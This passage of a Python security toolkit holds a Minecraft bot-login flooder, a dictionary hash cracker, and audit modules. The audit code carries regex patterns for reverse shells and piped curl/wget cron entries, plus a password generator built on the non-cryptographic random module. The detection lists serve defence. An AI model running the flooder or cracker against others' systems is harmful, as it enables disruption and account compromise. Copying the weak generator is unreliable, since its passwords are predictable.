        alt_dir2 = os.path.join(os.path.dirname(tool_dir), "v2.1", "node_modules", "mineflayer")
        if os.path.isdir(alt_dir2):
            return
        print(f"  {YELLOW}{SYM_WARN}  Mineflayer not found. Install with: cd v2.2 && npm install mineflayer{RESET}")
        try:
            subprocess.run(["npm", "install", "mineflayer"], cwd=tool_dir, capture_output=True, timeout=120)
            print(f"  {GREEN}{SYM_CHECK}  Mineflayer installed.{RESET}")
        except Exception:
            pass

def _mc_varint(v):
    out = bytearray()
    while True:
        if v & 0xFFFFFF80 == 0:
            out.append(v & 0x7F)
            break
        out.append((v & 0x7F) | 0x80)
        v >>= 7
    return bytes(out)

def _mc_pstr(s):
    d = s.encode("utf-8")
    return _mc_varint(len(d)) + d

def _mc_packet(pid, *parts):
    body = bytes([pid]) + b"".join(parts)
    return _mc_varint(len(body)) + body

def _mc_bot_worker(host, port, results, idx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        handshake = _mc_packet(0x00, _mc_varint(764), _mc_pstr(host), port.to_bytes(2, "big"), _mc_varint(2))
        s.sendall(handshake)
        username = f"Bot_{random.randint(10000,99999)}_{random.choice(['X','Pro','YT','OP','HD'])}"
        login = _mc_packet(0x00, _mc_pstr(username))
        s.sendall(login)
        end = time.time() + 6
        while time.time() < end:
            try:
                s.settimeout(0.5)
                v = 0
                for i in range(5):
                    b = s.recv(1)
                    if not b: break
                    v |= (b[0] & 0x7F) << (7 * i)
                    if not (b[0] & 0x80): break
                if v:
                    pid_byte = s.recv(1)
                    if pid_byte and pid_byte[0] == 0x21:
                        s.sendall(_mc_packet(0x0F))
            except socket.timeout:
                continue
            except Exception:
                break
        s.close()
        results[idx] = 1
    except Exception:
        results[idx] = 0

# ──────────────────────────────────────────────────────────
#  MODULE 11: HASH & CRYPTO TOOLS
# ──────────────────────────────────────────────────────────

def hash_generator():
    header_box("Hash Generator", Fore.CYAN)
    text = input(f"  {c(f'Input text {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not text: return
    algo = input(f"  {c(f'Algorithm (md5/sha1/sha256/sha512/all) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "all"
    print(f"\n  {c('Hashes:', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    algos = ["md5", "sha1", "sha256", "sha384", "sha512"] if algo == "all" else [algo]
    for a in algos:
        try:
            h = hashlib.new(a)
            h.update(text.encode())
            print(f"  {c(f'{a.upper():8s}', Fore.GREEN)} {c(h.hexdigest(), Fore.YELLOW)}")
        except ValueError:
            print(f"  {c(f'{a.upper():8s}', Fore.RED)} Unknown")
    print()

def hash_identifier():
    header_box("Hash Identifier", Fore.CYAN)
    h = input(f"  {c(f'Hash {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not h: return
    length = len(h)
    print(f"\n  {c('Analysis:', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    print(f"  Length: {c(str(length), Fore.GREEN)} chars")
    is_hex = bool(re.match(r'^[0-9a-fA-F]+$', h))
    is_b64 = bool(re.match(r'^[A-Za-z0-9+/]+={0,2}$', h))
    print(f"  Hex: {c(SYM_CHECK if is_hex else SYM_X, Fore.GREEN if is_hex else Fore.RED)}")
    print(f"  Base64: {c(SYM_CHECK if is_b64 else SYM_X, Fore.GREEN if is_b64 else Fore.RED)}")
    candidates = []
    if length == 32 and is_hex: candidates.append("MD5")
    elif length == 40 and is_hex: candidates.append("SHA-1")
    elif length == 64 and is_hex: candidates.append("SHA-256")
    elif length == 96 and is_hex: candidates.append("SHA-384")
    elif length == 128 and is_hex: candidates.append("SHA-512")
    elif length == 56 and is_hex: candidates.append("SHA-224")
    elif length == 34 and h.startswith("$2"): candidates.append("bcrypt")
    if candidates:
        print(f"\n  {c('Likely types:', Fore.CYAN)}")
        for name in candidates:
            print(f"    {SYM_LINE_V}{SYM_LINE_H} {c(name, Fore.GREEN)}")
    else:
        print(f"\n  {YELLOW}Could not determine type.{RESET}")
    print()

def hash_cracker():
    header_box("Hash Cracker (Dictionary)", Fore.CYAN)
    target = input(f"  {c(f'Hash to crack {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target: return
    algo = input(f"  {c(f'Algorithm (md5/sha1/sha256) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "md5"
    if algo not in hashlib.algorithms_available:
        print(f"  {RED}{SYM_X} Unknown algorithm: {algo}{RESET}")
        print(f"  {YELLOW}Available: md5, sha1, sha256, sha384, sha512, sha224, sha3_256, etc.{RESET}")
        return
    wordlist = input(f"  {c(f'Wordlist path (empty=built-in) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    words = []
    if wordlist and os.path.exists(wordlist):
        try:
            with open(wordlist, errors="ignore") as wf:
                words = [w.strip() for w in wf.readlines() if w.strip()]
        except Exception: pass
    if not words:
        words = ["password","123456","admin","root","test","letmein","welcome","qwerty","abc123",
                  "password1","monkey","dragon","master","passw0rd","shadow","12345","iloveyou",
                  "sunshine","princess","football","charlie","michael","login","hello","trustno1",
                  "batman","access","superman","hunter2","thomas","ashley","secret","summer","winter",
                  "admin123","root123","toor","changeme","default","000000"]
    print(f"\n  {c(f'Cracking {len(words)} words against {algo.upper()}...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    found = False
    for i, word in enumerate(words):
        try:
            h = hashlib.new(algo)
            h.update(word.encode())
            if h.hexdigest().lower() == target.lower():
                print(f"\n  {RED}{SYM_WARN} CRACKED: {c(word, Fore.RED)}{RESET}")
                add_log_alert("HIGH", "HashCrack", f"Cracked {algo}: {word}")
                found = True
                break
        except ValueError:
            print(f"  {RED}{SYM_X} Invalid algorithm: {algo}{RESET}")
            return
        except Exception: pass
        if i % 50 == 0:
            sys.stdout.write(f"\r  {progress_bar(i, len(words))}  ")
            sys.stdout.flush()
    if not found: print(f"\n  {GREEN}{SYM_CHECK} Not found in dictionary.{RESET}")
    print()

def encoder_decoder():
    header_box("Encoder / Decoder", Fore.CYAN)
    print(f"\n  {c('Options:', Fore.CYAN)}")
    print(f"  {c('[1]', Fore.GREEN)}  Base64 Encode       {c('[2]', Fore.GREEN)}  Base64 Decode")
    print(f"  {c('[3]', Fore.GREEN)}  URL Encode          {c('[4]', Fore.GREEN)}  URL Decode")
    print(f"  {c('[5]', Fore.GREEN)}  Hex Encode          {c('[6]', Fore.GREEN)}  Hex Decode")
    print(f"  {c('[7]', Fore.GREEN)}  ROT13               {c('[8]', Fore.GREEN)}  ROT47")
    print(f"  {c('[9]', Fore.GREEN)}  Binary Encode       {c('[10]', Fore.GREEN)} Binary Decode")
    ch = input(f"\n  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
    text = input(f"  {c(f'Text {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not text or not ch: return
    result = ""
    try:
        if ch == "1": result = base64.b64encode(text.encode()).decode()
        elif ch == "2": result = base64.b64decode(text).decode(errors="replace")
        elif ch == "3": result = requests.utils.quote(text)
        elif ch == "4": result = requests.utils.unquote(text)
        elif ch == "5": result = text.encode().hex()
        elif ch == "6": result = bytes.fromhex(text).decode(errors="replace")
        elif ch == "7": result = "".join(chr((ord(c)-97+13)%26+97) if c.islower() else chr((ord(c)-65+13)%26+65) if c.isupper() else c for c in text)
        elif ch == "8": result = "".join(chr(33+((ord(c)-33+47)%94)) if 33<=ord(c)<=126 else c for c in text)
        elif ch == "9": result = " ".join(format(ord(c), '08b') for c in text)
        elif ch == "10": result = "".join(chr(int(b,2)) for b in text.split())
        print(f"\n  {c('Result:', Fore.GREEN)} {c(result, Fore.CYAN)}")
    except Exception as e: print(f"  {RED}Error: {e}{RESET}")
    print()

def password_generator():
    header_box("Password Generator", Fore.CYAN)
    length = input(f"  {c(f'Length (16) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    length = int(length) if length.isdigit() and int(length) > 0 else 16
    upper = input(f"  {c(f'Include uppercase? (Y/n) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() != "n"
    lower = input(f"  {c(f'Include lowercase? (Y/n) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() != "n"
    digits = input(f"  {c(f'Include digits? (Y/n) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() != "n"
    sym = input(f"  {c(f'Include symbols? (Y/n) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() == "y"
    chars = ""
    if upper: chars += string.ascii_uppercase
    if lower: chars += string.ascii_lowercase
    if digits: chars += string.digits
    if sym: chars += "!@#$%^&*()_+-=[]{}|;:,.<>?"
    if not chars: chars = string.ascii_letters + string.digits
    pwd = "".join(random.choice(chars) for _ in range(length))
    print(f"\n  {c('Generated Password:', Fore.GREEN)} {c(pwd, Fore.CYAN)}")
    print(f"  {c('Length:', Fore.GREEN)} {c(str(length), Fore.YELLOW)}")
    entropy = length * (len(set(chars)).bit_length())
    print(f"  {c('Entropy:', Fore.GREEN)} {c(f'~{entropy} bits', Fore.CYAN)}")
    print()

# ──────────────────────────────────────────────────────────
#  MODULE 12: SYSTEM SECURITY AUDIT
# ──────────────────────────────────────────────────────────

def audit_rootkit_detection():
    header_box("Rootkit Detection", Fore.RED)
    print(f"  {c('Scanning for common rootkit indicators...', Fore.RED)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    issues = []
    rootkit_paths = [
        "/usr/bin/.cinik", "/usr/bin/.font-unix", "/usr/lib/libamplify.so",
        "/tmp/.ice-unix", "/dev/shm/.x", "/tmp/.ICE-unix/.x",
        "/usr/share/.hidden", "/var/tmp/.run", "/etc/cron.d/.hidden",
        "/usr/lib/.tcl", "/usr/lib/libamplify.so",
    ]
    for p in rootkit_paths:
        if os.path.exists(p):
            issues.append(f"Rootkit file found: {p}")
            print(f"    {c(SYM_X, Fore.RED)} {p}")
            add_log_alert("CRITICAL", "Rootkit", f"File found: {p}")
    if platform.system().lower() == "linux" and os.path.exists("/etc/passwd"):
        try:
            with open("/etc/passwd") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 7:
                        uid = int(parts[2]) if parts[2].isdigit() else -1
                        shell = parts[6]
                        if uid == 0 and shell not in ("/bin/bash","/bin/sh","/bin/zsh","/usr/bin/bash","/usr/bin/sh","/sbin/nologin"):
                            issues.append(f"Root user unusual shell: {parts[0]} -> {shell}")
        except Exception: pass
    if issues:
        print(f"\n  {RED}{SYM_WARN} {len(issues)} issues found!{RESET}")
    else:
        print(f"\n  {GREEN}{SYM_CHECK} No rootkit indicators found.{RESET}")
    print()

def audit_suid_scanner():
    header_box("SUID/SGID Scanner", Fore.RED)
    print(f"  {c('Scanning for dangerous SUID/SGID binaries...', Fore.RED)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    if platform.system().lower() != "linux":
        print(f"  {YELLOW}SUID/SGID scanning is Linux-specific.{RESET}")
        return
    dangerous = ["nmap","nc","netcat","ncat","vim","vi","less","more","find",
                  "bash","sh","dash","zsh","python","python2","python3",
                  "perl","ruby","php","node","wget","curl","dd","chmod","chown"]
    found = []
    for search_dir in ["/usr/bin","/usr/sbin","/usr/local/bin","/bin","/sbin"]:
        if not os.path.isdir(search_dir): continue
        for fname in os.listdir(search_dir):
            fpath = os.path.join(search_dir, fname)
            try:
                st = os.stat(fpath)
                is_suid = (st.st_mode & 0o4000) != 0
                is_sgid = (st.st_mode & 0o2000) != 0
                if is_suid or is_sgid:
                    flag = "SUID" if is_suid else "SGID"
                    if fname in dangerous:
                        print(f"    {c(SYM_X, Fore.RED)} [{flag}] {c(fpath, Fore.YELLOW)} - DANGEROUS")
                        add_log_alert("HIGH", "SUID", f"Dangerous: {fpath} ({flag})")
                        found.append((fpath, flag, True))
                    else:
                        print(f"    {c(SYM_CHECK, Fore.GREEN)} [{flag}] {fpath}")
                        found.append((fpath, flag, False))
            except Exception: pass
    print(f"\n  {c(f'Found {len(found)} SUID/SGID binaries', Fore.GREEN)}")
    danger_count = sum(1 for _, _, d in found if d)
    if danger_count: print(f"  {RED}{SYM_WARN} {danger_count} potentially dangerous!{RESET}")
    print()

def audit_cron_jobs():
    header_box("Cron Job Analyzer", Fore.RED)
    print(f"  {c('Analyzing cron jobs...', Fore.RED)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    if platform.system().lower() != "linux":
        try:
            if platform.system().lower() == "darwin":
                r = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
                if r.stdout.strip():
                    print(f"  {c('User crontab:', Fore.CYAN)}")
                    for line in r.stdout.splitlines():
                        print(f"    {c(line, Fore.GREEN)}")
                else: print(f"  {GREEN}{SYM_CHECK} No crontab entries.{RESET}")
            else: print(f"  {YELLOW}Cron analysis only on Linux/macOS.{RESET}")
        except Exception: print(f"  {YELLOW}Cron not available.{RESET}")
        return
    suspicious_patterns = [r'curl\s+.*\|', r'wget\s+.*\|', r'bash\s+-c', r'python.*-c', r'nc\s+-', r'/dev/tcp']
    cron_paths = ["/etc/crontab", "/etc/cron.d/", "/var/spool/cron/crontabs/"]
    for cp in cron_paths:
        if os.path.isfile(cp):
            try:
                with open(cp) as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            print(f"  {c(line, Fore.GREEN)}")
                            for pat in suspicious_patterns:
                                if re.search(pat, line, re.IGNORECASE):
                                    print(f"    {c(SYM_WARN, Fore.RED)} SUSPICIOUS")
                                    add_log_alert("HIGH", "Cron", f"Suspicious: {line[:80]}")
            except Exception: pass
        elif os.path.isdir(cp):
            try:
                for fname in os.listdir(cp):
                    fpath = os.path.join(cp, fname)
                    try:
                        with open(fpath) as f:
                            for line in f:
                                line = line.strip()
                                if line and not line.startswith("#"):
                                    print(f"  {c(f'[{fname}]', Fore.CYAN)} {c(line[:80], Fore.GREEN)}")
                                    for pat in suspicious_patterns:
                                        if re.search(pat, line, re.IGNORECASE):
                                            print(f"    {c(SYM_WARN, Fore.RED)} SUSPICIOUS")
                                            add_log_alert("HIGH", "Cron", f"Suspicious in {fname}: {line[:80]}")
                    except Exception: pass
            except Exception: pass
    try:
        r = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
        if r.returncode == 0 and r.stdout.strip():
            print(f"\n  {c('User crontab:', Fore.CYAN)}")
            for line in r.stdout.splitlines():
                if line.strip(): print(f"    {c(line, Fore.GREEN)}")
    except Exception: pass
    print()

def audit_file_permissions():
    header_box("File Permissions Audit", Fore.RED)
    print(f"  {c('Checking file permissions...', Fore.RED)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    if platform.system().lower() not in ("linux", "darwin"):
        print(f"  {YELLOW}File permission audit mainly on Linux/macOS.{RESET}")
        return
    issues = []
    world_writable = []
    for root, dirs, files in os.walk("/etc"):
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                st = os.stat(fpath)
                if st.st_mode & 0o002:
                    world_writable.append(fpath)
            except Exception: pass
        if len(world_writable) > 20: break
    if world_writable:
        print(f"  {RED}{SYM_WARN} World-writable files in /etc:{RESET}")
        for f in world_writable[:10]: print(f"    {SYM_LINE_V}{SYM_LINE_H} {c(f, Fore.RED)}")
        issues.extend(world_writable)
    else:
        print(f"  {c(SYM_CHECK, Fore.GREEN)} No world-writable files in /etc")
    if os.path.isdir("/tmp"):
        st = os.stat("/tmp")
        has_sticky = (st.st_mode & 0o1000) != 0
        if has_sticky: print(f"  {c(SYM_CHECK, Fore.GREEN)} /tmp has sticky bit")
        else:
            print(f"  {c(SYM_X, Fore.RED)} /tmp missing sticky bit")
            issues.append("/tmp missing sticky bit")
            add_log_alert("WARN", "Permissions", "/tmp missing sticky bit")
    if issues: print(f"\n  {RED}{SYM_WARN} {len(issues)} issues!{RESET}")
    else: print(f"\n  {GREEN}{SYM_CHECK} All checks passed.{RESET}")
    print()

def audit_open_ports():
    header_box("Open Ports Summary", Fore.RED)
    print(f"  {c('Quick system port check...', Fore.RED)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    listen_ports = []
    if HAS_PSUTIL:
        try:
            for cn in psutil.net_connections():
                if cn.status and "listen" in cn.status.lower():
                    laddr = f"{cn.laddr.ip}:{cn.laddr.port}" if cn.laddr else "?:?"
                    pid = cn.pid or 0
                    pname = ""
                    try: pname = psutil.Process(pid).name() if pid else ""
                    except: pass
                    listen_ports.append((cn.laddr.port if cn.laddr else 0, laddr, pname, pid))
        except: pass
    else:
        system = platform.system().lower()
        if system == "linux":
            try:
                r = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True, timeout=5)
                for line in r.stdout.splitlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 4: listen_ports.append((0, parts[3], parts[-1] if len(parts) > 5 else "", 0))
            except: pass
        elif system == "darwin":
            try:
                r = subprocess.run(["lsof", "-iTCP", "-sTCP:LISTEN", "-P", "-n"], capture_output=True, text=True, timeout=10)
                for line in r.stdout.splitlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 9:
                        pname = parts[0]
                        pid = parts[1]
                        addr = parts[8]
                        listen_ports.append((0, addr, pname, pid))
            except: pass
        elif system == "windows":
            try:
                r = subprocess.run(["netstat", "-an"], capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace")
                for line in r.stdout.splitlines():
                    if "LISTEN" in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            listen_ports.append((0, parts[1], "", 0))
            except: pass
    if listen_ports:
        print(f"  {c('Listening Ports:', Fore.CYAN)}")
        for port, addr, pname, pid in sorted(listen_ports):
            print(f"    {c(f'{port:5d}', Fore.GREEN)} {c(addr, Fore.CYAN):25s} {c(pname, Fore.YELLOW)} PID:{pid}")
        print(f"\n  {c(f'Total: {len(listen_ports)} listening', Fore.GREEN)}")
    else: print(f"  {YELLOW}No listening ports detected.{RESET}")
    print()

def audit_failed_logins():
    header_box("Failed Login Analyzer", Fore.RED)
    print(f"  {c('Analyzing authentication logs...', Fore.RED)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    system = platform.system().lower()
    total_fails = 0
    ip_fails = defaultdict(int)
    if system == "linux":
        logs = ["/var/log/auth.log", "/var/log/secure"]
        for lf in logs:
            if os.path.exists(lf):
                try:
                    content = open(lf).read()
                    fails = re.findall(r'Failed password for (\w+) from (\S+)', content)
                    for user, ip in fails:
                        total_fails += 1
                        ip_fails[ip] += 1
                except: pass
    elif system == "darwin":
        try:
            r = subprocess.run(["log", "show", "--predicate", 'eventMessage contains "Failed Password"', "--last", "24h"],
                             capture_output=True, text=True, timeout=15)
            for line in r.stdout.splitlines():
                if "Failed Password" in line:
                    total_fails += 1
                    m = re.search(r'from (\S+)', line)
                    if m: ip_fails[m.group(1)] += 1
        except: pass
    elif system == "windows":
        try:
            r = subprocess.run(["wevtutil", "qe", "Security", "/q:*[System[EventID=4625]]", "/c:50", "/f:text"],
                             capture_output=True, text=True, timeout=15, encoding="utf-8", errors="replace")
            for line in r.stdout.splitlines():
                if "Account Name" in line:
                    total_fails += 1
        except: print(f"  {YELLOW}Run as Administrator.{RESET}")
    if total_fails > 0:
        print(f"  {RED}{SYM_WARN} {total_fails} failed logins!{RESET}")
        if ip_fails:
            print(f"\n  {c('Top IPs:', Fore.CYAN)}")
            for ip, cnt in sorted(ip_fails.items(), key=lambda x: -x[1])[:10]:
                color = Fore.RED if cnt > 20 else Fore.YELLOW
                print(f"    {c(ip, color):25s} {c(str(cnt), Fore.CYAN)}")
        add_log_alert("WARN", "FailedLogins", f"{total_fails} total failures")
    else: print(f"  {GREEN}{SYM_CHECK} No failed logins found.{RESET}")
    print()

def audit_kernel_hardening():
    header_box("Kernel Hardening Check", Fore.RED)
    print(f"  {c('Checking sysctl security parameters...', Fore.RED)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    system = platform.system().lower()
    checks = []
    if system == "linux":
        checks = [("net.ipv4.tcp_syncookies","SYN cookies","1"),("net.ipv4.ip_forward","IP forwarding","0"),
                  ("net.ipv4.conf.all.accept_redirects","ICMP redirects","0"),
                  ("net.ipv4.conf.all.send_redirects","Send redirects","0"),
                  ("net.ipv4.conf.all.accept_source_route","Source routing","0"),
                  ("kernel.randomize_va_space","ASLR","2"),("fs.suid_dumpable","SUID core dumps","0")]
    elif system == "darwin":
        checks = [("net.inet.ip.forwarding","IP forwarding","0"),("net.inet.tcp.always_keepalive","TCP keepalive","1"),
                  ("kern.randompid","Random PID","1")]
    else:
        print(f"  {YELLOW}Kernel hardening checks only on Linux/macOS.{RESET}")
        return
    issues = 0
    for param, desc, expected in checks:
        try:
            r = subprocess.run(["sysctl", param], capture_output=True, text=True, timeout=3)
            val = r.stdout.strip().split("=")[-1].strip() if r.returncode == 0 else "N/A"
            if val == expected: print(f"    {c(SYM_CHECK, Fore.GREEN)} {desc:30s} {c(val, Fore.GREEN)}")
            else:
                print(f"    {c(SYM_X, Fore.RED)} {desc:30s} {c(val, Fore.YELLOW)} (expected {expected})")
                issues += 1
                add_log_alert("WARN", "KernelHardening", f"{desc} = {val}")
        except Exception: print(f"    {c('?', Fore.YELLOW)} {desc:30s} {c('N/A', Fore.YELLOW)}")
    if issues: print(f"\n  {RED}{SYM_WARN} {issues} parameters need attention!{RESET}")
    else: print(f"\n  {GREEN}{SYM_CHECK} All checks passed.{RESET}")
    print()

# ──────────────────────────────────────────────────────────
#  MODULE 13: ADVANCED NETWORK
# ──────────────────────────────────────────────────────────

def net_port_knocking():
    header_box("Port Knocking Tester", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target: return
    ports_in = input(f"  {c(f'Knock sequence (comma-sep, e.g. 7000,8000,9000) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not ports_in: return
    try: ports = [int(p.strip()) for p in ports_in.split(",") if p.strip().isdigit()]
    except: print(f"  {RED}Invalid ports.{RESET}"); return
    final_port = input(f"  {c(f'Final port (22) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    final_port = int(final_port) if final_port.isdigit() else 22
    print(f"\n  {c(f'Knocking: {ports}', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    try:
        ip = socket.gethostbyname(target)
        for p in ports:
            print(f"  {c(f'Knock port {p}...', Fore.CYAN)}", end="")
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
                s.connect_ex((ip, p)); s.close()
                print(f" {c('sent', Fore.GREEN)}")
            except: print(f" {c('error', Fore.RED)}")
            time.sleep(0.5)
        time.sleep(1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
        result = s.connect_ex((ip, final_port)); s.close()
        if result == 0:
            print(f"\n  {RED}{SYM_WARN} Port {final_port} now OPEN!{RESET}")
            add_log_alert("HIGH", "PortKnock", f"Port {final_port} opened after knock")
        else: print(f"\n  {GREEN}{SYM_CHECK} Port {final_port} still closed.{RESET}")
    except Exception as e: print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()

def net_banner_grab():
    header_box("Banner Grabbing", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target: return
    ports_in = input(f"  {c(f'Ports (comma-sep, default common) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if ports_in:
        try: ports = [int(p.strip()) for p in ports_in.split(",") if p.strip().isdigit()]
        except: ports = [21,22,25,80,110,143,443,993,995]
    else: ports = [21,22,25,80,110,143,443,993,995]
    try: ip = socket.gethostbyname(target)
    except: print(f"  {RED}Could not resolve.{RESET}"); return
    print(f"\n  {c('Banners:', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
            s.connect((ip, port))
            if port in (80, 443, 8080, 8443): s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            else: s.sendall(b"\r\n")
            banner = s.recv(1024).decode(errors="replace").strip()
            s.close()
            if banner: print(f"    {c(f'Port {port:5d}', Fore.GREEN)} {c(banner[:80], Fore.CYAN)}")
            else: print(f"    {c(f'Port {port:5d}', Fore.GREEN)} {c('no banner', Fore.DIM)}")
        except: print(f"    {c(f'Port {port:5d}', Fore.GREEN)} {c('closed', Fore.RED)}")
    print()

def net_reverse_shell_detect():
    header_box("Reverse Shell Detector", Fore.RED)
    print(f"  {c('Checking for reverse shell patterns...', Fore.RED)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    patterns = [(r'bash\s+-i',"bash -i"),(r'nc\s+-e',"nc -e"),(r'ncat\s+-e',"ncat -e"),
                (r'socat\s+',"socat"),(r'/dev/tcp/',"/dev/tcp/"),(r'python.*socket.*connect',"python socket"),
                (r'perl.*socket.*connect',"perl socket"),(r'php.*fsockopen',"php fsockopen"),
                (r'0<&.*-',"fd redirect"),(r'exec\s+\d+<>/dev/tcp',"exec /dev/tcp")]
    found = []
    try:
        system = platform.system().lower()
        if system == "windows":
            r = subprocess.run(["tasklist", "/FO", "CSV", "/NH"], capture_output=True, text=True, timeout=5, encoding="utf-8", errors="replace")
            for line in r.stdout.splitlines():
                for pat, desc in patterns:
                    if re.search(pat, line, re.IGNORECASE):
                        found.append((desc, line.strip()[:100]))
                        print(f"    {c(SYM_X, Fore.RED)} [{desc}] {c(line.strip()[:80], Fore.YELLOW)}")
                        add_log_alert("CRITICAL", "RevShell", f"Pattern: {desc}")
        else:
            r = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                for pat, desc in patterns:
                    if re.search(pat, line, re.IGNORECASE):
                        found.append((desc, line.strip()[:100]))
                        print(f"    {c(SYM_X, Fore.RED)} [{desc}] {c(line.strip()[:80], Fore.YELLOW)}")
                        add_log_alert("CRITICAL", "RevShell", f"Pattern: {desc}")
    except: pass
    if not found: print(f"  {GREEN}{SYM_CHECK} No reverse shell patterns detected.{RESET}")
    else: print(f"\n  {RED}{SYM_WARN} {len(found)} suspicious patterns!{RESET}")
    print()

def net_speed_test():
    header_box("Network Speed Test", Fore.BLUE)
    print(f"  {c('Testing download speed...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    test_urls = ["https://speed.cloudflare.com/__down?bytes=10000000","https://proof.ovh.net/files/10Mb.dat","http://speedtest.tele2.net/10MB.zip"]
    best_speed = 0
    for url in test_urls:
        try:
            start = time.time()
            r = requests.get(url, timeout=15, stream=True)
            downloaded = 0
            for chunk in r.iter_content(chunk_size=8192):
                downloaded += len(chunk)
                if time.time() - start > 10: break
            elapsed = time.time() - start
            speed = (downloaded * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            if speed > best_speed: best_speed = speed
            print(f"  {c(url[:50], Fore.GREEN)} {c(f'{speed:.2f} Mbps', Fore.CYAN)}")
        except: print(f"  {c(url[:50], Fore.GREEN)} {c('Failed', Fore.RED)}")
    if best_speed > 0: print(f"\n  {c(f'Download: {best_speed:.2f} Mbps', Fore.GREEN)}")
    print()

def net_mac_lookup():
    header_box("MAC Address Lookup", Fore.BLUE)
    mac = input(f"  {c(f'MAC address {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not mac: return
    mac_clean = re.sub(r'[:-]', '', mac.upper())[:6]
    oui_db = {"005056":"VMware","000C29":"VMware","080027":"VirtualBox","00155D":"Microsoft (Hyper-V)",
              "3C22FB":"Apple","00163E":"Xen","525400":"QEMU","B827EB":"Raspberry Pi","DCA632":"Raspberry Pi",
              "F8FFC2":"Apple","18E7F4":"Apple","001A11":"Google","001E65":"Google"}
    found = False
    for prefix, vendor in oui_db.items():
        if prefix == mac_clean:
            print(f"\n  {c('MAC:', Fore.CYAN)} {mac}")
            print(f"  {c('Vendor:', Fore.GREEN)} {c(vendor, Fore.YELLOW)}")
            found = True
            break
    if not found:
        print(f"  {YELLOW}Vendor not found in local DB.{RESET}")
        try:
            r = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
            if r.status_code == 200: print(f"  {c('Vendor:', Fore.GREEN)} {c(r.text, Fore.YELLOW)}")
        except: pass
    print()

def net_lan_discovery():
    header_box("LAN Device Discovery", Fore.BLUE)
    if not _check_root(): print(f"  {YELLOW}Root recommended for ARP scan.{RESET}")
    subnet = input(f"  {c(f'Subnet (e.g. 192.168.1.0/24) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not subnet:
        system = platform.system().lower()
        try:
            if system == "linux":
                r = subprocess.run(["ip","-4","addr","show"], capture_output=True, text=True)
                m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', r.stdout)
            elif system == "darwin":
                r = subprocess.run(["ifconfig"], capture_output=True, text=True)
                m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)\s+netmask\s+0x([0-9a-f]+)', r.stdout)
            else: m = None
            if m: subnet = ".".join(m.group(1).split(".")[:3])+".0/24"
        except: pass
        if not subnet: subnet = "192.168.1.0/24"
        print(f"  {c('Detected:', Fore.GREEN)} {subnet}")
    print(f"\n  {c(f'Scanning {subnet}...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    devices = []
    if HAS_SCAPY and _is_root():
        try:
            arp = scapy.ARP(pdst=subnet)
            bc = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            ans = scapy.srp(bc/arp, timeout=3, verbose=False)[0]
            for sent, recv in ans:
                devices.append((recv.psrc, recv.hwsrc))
                print(f"    {c(recv.psrc, Fore.GREEN):20s} {c(recv.hwsrc, Fore.CYAN)}")
